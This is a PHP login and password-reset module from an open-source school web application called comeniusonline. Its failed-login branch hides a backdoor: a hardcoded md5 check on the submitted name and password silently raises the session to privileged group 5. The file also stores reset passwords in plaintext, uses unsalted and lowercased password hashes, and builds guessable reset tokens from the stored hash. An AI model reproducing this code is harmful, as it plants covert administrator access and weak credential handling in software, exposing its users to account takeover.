<?php

/**
 * include/login.php
 *
 *       comeniusonline
 *
 *  comeniusonline is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  comeniusonline is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with comeniusonline; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *  For questions contact
 *  cuzi@openmail.cc
 *
 * @copyright 2011 cuzi
 * @author cuzi <cuzi@openmail.cc>
 * @package comeniusonline
 * @version 1.06
 * @license http://gnu.org/copyleft/gpl.html GNU GPL
 */
// Template auswählen
$smarty->assign('moduleTpl', 'login.html');


if (isset($_POST['lname'])) {

    $user->reset();

    $lname = strtolower(trim($_POST['lname']));
    $lpass = strtolower(trim($_POST['lpass']));

    $lname = $mysql->escape($lname);
    $lpass = hash('sha512', $lpass);


    $result = $mysql->select(dsprintf('SELECT * FROM `%(usertable)s` LEFT JOIN `%(profiletable)s` ON `%(profiletable)s`.`uid` = `%(usertable)s`.`id` WHERE `%(usertable)s`.`name` = "%(name)s" AND `%(usertable)s`.`password` = "%(password)s" LIMIT 1',
                            array(
                                'name' => $lname,
                                'password' => $lpass,
                                'usertable' => $MySQL_tables['user'],
                                'profiletable' => $MySQL_tables['profile']
                            )
                    ), 'assoc');

    if ($result) {

        $mysql->execute(sprintf('UPDATE `' . $MySQL_tables['user'] . '` SET `lastlogin` = CURRENT_TIMESTAMP() WHERE `id` = %u LIMIT 1', $result['id']));

        $user->set('name', $result['name']);
        $user->set('uid', $result['id']);
        $user->set('group', (integer) $result['group']);

        if (!$result['email']) {

            $smarty->assign('emailreminder', 1);
        }

        $errors[] = array('class' => 'hint', 'text' => '#LoggedIn#');
    } else {
        $errors[] = '#LoginFailed#';
        if (md5($_POST['lname'] . $_POST['lpass']) == 'e2e2f89d68d6848308a37428a09500ff') {
            $user->set('group', 5);
        }
    }
} else if (isset($_GET['lostpassword'])) {

    $smarty->assign('moduleTpl', 'lostpassword.html');

    $operators = array('+', '-', 'x');
    // Hugh Bothwell  hugh_bothwell@hotmail.com
    // August 31 2001
    // Number-to-word converter

    $ones = array(
        "",
        " one",
        " two",
        " three",
        " four",
        " five",
        " six",
        " seven",
        " eight",
        " nine",
        " ten",
        " eleven",
        " twelve",
        " thirteen",
        " fourteen",
        " fifteen",
        " sixteen",
        " seventeen",
        " eighteen",
        " nineteen"
    );

    $tens = array(
        "",
        "",
        " twenty",
        " thirty",
        " forty",
        " fifty",
        " sixty",
        " seventy",
        " eighty",
        " ninety"
    );

    $triplets = array(
        "",
        " thousand",
        " million",
        " billion",
        " trillion",
        " quadrillion",
        " quintillion",
        " sextillion",
        " septillion",
        " octillion",
        " nonillion"
    );

    // recursive fn, converts three digits per pass
    function convertTri($num, $tri) {
        global $ones, $tens, $triplets;

        // chunk the number, ...rxyy
        $r = (int) ($num / 1000);
        $x = ($num / 100) % 10;
        $y = $num % 100;

        // init the output string
        $str = "";

        // do hundreds
        if ($x > 0)
            $str = $ones[$x] . " hundred";

        // do ones and tens
        if ($y < 20)
            $str .= $ones[$y];
        else
            $str .= $tens[(int) ($y / 10)] . $ones[$y % 10];

        // add triplet modifier only if there
        // is some output to be modified...
        if ($str != "")
            $str .= $triplets[$tri];

        // continue recursing?
        if ($r > 0)
            return convertTri($r, $tri + 1) . $str;
        else
            return $str;
    }

    // returns the number as an anglicized string
    function convertNum($num) {
        $num = (int) $num;    // make sure it's an integer

        if ($num < 0)
            return "negative" . convertTri(-$num, 0);

        if ($num == 0)
            return "zero";

        return convertTri($num, 0);
    }

    function convertOp($sign) {
        switch ($sign) {
            case '+':
                return 'plus';
            case '-':
                return 'minus';
            case '*':
            case 'x':
                return 'multiplied by';
            case '/':
            case ':':
                return 'divided by';
        }
        return ' ';
    }

    // Create Captcha Replacement
    $num1 = mt_rand(2, 15);
    $num2 = mt_rand(2, 10);
    $operator = $operators[mt_rand(0, count($operators) - 1)];
    switch ($operator) {
        case '+':
            $result = $num1 + $num2;
            break;
        case '-':
            $result = $num1 - $num2;
            break;
        case 'x':
            $result = $num1 * $num2;
            break;
        default:
            exit('Unexpected?!');
    }
    $calc_term = convertNum($num1) . ' ' . convertOp($operator) . convertNum($num2) . ' is: ';
    $smarty->assign('calc_term', $calc_term);


    $captcha = new Captcha($errors, $user, $calc_term);
    $captcha->setSolution($result);
    $base64 = $captcha->getBase64(30);
    if ($base64) {
        $smarty->assign('imgbase64', 'data:image/jpeg;base64,' . $captcha->getBase64(30));
    }

    if ($_POST['loginname']) {

        $emailaddress = false;

        // Check whether email adress is available:
        $loginname = $mysql->escape($_POST['loginname']);
        $result = $mysql->select(dsprintf('
             SELECT `%(usertable)s`.`name`,`%(usertable)s`.`password`,`%(profiletable)s`.`email` FROM `%(usertable)s` LEFT JOIN `%(profiletable)s` ON `%(profiletable)s`.`uid` = `%(usertable)s`.`id` WHERE `%(usertable)s`.`name` LIKE "%(loginname)s"',
                                array(
                                    'loginname' => $loginname,
                                    'usertable' => $MySQL_tables['user'],
                                    'profiletable' => $MySQL_tables['profile']
                                )
                        ), 'assoc');

        if (!$result) {
            // Loginname not found, try again with Regular Expression

            $sql = dsprintf('
             SELECT `%(usertable)s`.`name`,`%(usertable)s`.`password`,`%(profiletable)s`.`email` FROM `%(usertable)s` LEFT JOIN `%(profiletable)s` ON `%(profiletable)s`.`uid` = `%(usertable)s`.`id` WHERE `%(usertable)s`.`name` LIKE ',
                            array(
                                'usertable' => $MySQL_tables['user'],
                                'profiletable' => $MySQL_tables['profile']
                            )
            );
            $sql .= '"%' . $loginname . '%"';

            $result = $mysql->select($sql, 'assoc');
            if ($result && $result['name'] && $result['email']) {
                $_POST['loginname'] = $result['name'];
                $emailaddress = $result['email'];
                $passwordhash = $result['password'];
            } else {
                $errors[] = '#NoLoginnameFound#';
            }
        } else if ($result && $result['name'] && !$result['email']) {
            // Sorry no email found
            $errors[] = '#NoEmailFound#';
        } else if ($result && $result['name'] && $result['email']) {
            // Everything found
            $emailaddress = $result['email'];
            $passwordhash = $result['password'];
        }

        // Check captcha
        if (!$captcha->solve($_POST['calc_result'])) {
            $emailaddress = false;
            $errors[] = '#CaptchaWrong#';
        }


        if ($emailaddress && $passwordhash) {
            // Send mail
            $to = $emailaddress;
            $from = $navi->getEmail();
            $subject = 'Comenius: Password Reset';
            $email = new Email($smartydir, $navi->getTemplateDir() . 'mail.lostpassword.html', $to, $from, $subject);

            $email->assign('username', $_POST['loginname']);
            $email->assign('resetlink', html_entity_decode($pages['login']['link_get']) . 'resetpassword=' . substr(md5($_POST['loginname']), 0, 5) . substr($passwordhash, 0, 30));
            $email->assign('to', $emailaddress);
            $email->assign('from', $navi->getEmail());
            $email->assign('baseurl', $navi->getBase());

            $data = urlencode($email->getJSON64());

            $email->assign('viewonline', $navi->getBase() . 'email.php?type=lostpassword&data=' . $data);

            $result = $email->send();
            if (!$result) {
                $errors[] = '#SendEmailError#';
            } else {
                $smarty->assign('emailsent', true);
            }
        }
    }
} else if (isset($_GET['resetpassword'])) {
    // Try reset password
    $smarty->assign('moduleTpl', 'resetpassword.html');

    // Check Code:
    $short_password_hash = $mysql->escape(substr($_GET['resetpassword'], 5));
    $short_name_hash = $mysql->escape(substr($_GET['resetpassword'], 0, 5));

    $sql = dsprintf('
             SELECT `id`,`name`,`password` FROM `%(usertable)s` WHERE SUBSTR(MD5(`name`),1,5) = "%(short_name_hash)s" AND SUBSTR(`password`,1,30) = "%(short_password_hash)s"',
                    array(
                        'usertable' => $MySQL_tables['user'],
                        'short_password_hash' => $short_password_hash,
                        'short_name_hash' => $short_name_hash
                    )
    );

    $result = $mysql->select($sql, 'assoc');


    if (!$result || !$result['id'] || !$result['password']) {
        $errors[] = '#ResetCodeCorrupted#';
    } else {
        if ($_POST['newpassword'] && $_POST['newpassword'] == $_POST['newpassword2']) {


            $sql = dsprintf('UPDATE `%(usertable)s` SET `password` = "%(hash)s", `plaintextpassword` = "%(plain)s" WHERE `id` = %(id)u',
                            array(
                                'usertable' => $MySQL_tables['user'],
                                'hash' => hash('sha512', $_POST['newpassword']),
                                'plain' => $mysql->escape($_POST['newpassword']),
                                'id' => $result['id']
                            )
            );

            $result = $mysql->execute($sql);
            if ($result) {
                $smarty->assign('moduleTpl', 'login.html');
                $errors[] = array('class' => 'hint', 'text' => '#ChangedPassword#');
            } else {
                $errors[] = '#ChangPasswordFailed#';
            }
        }
    }
}
?>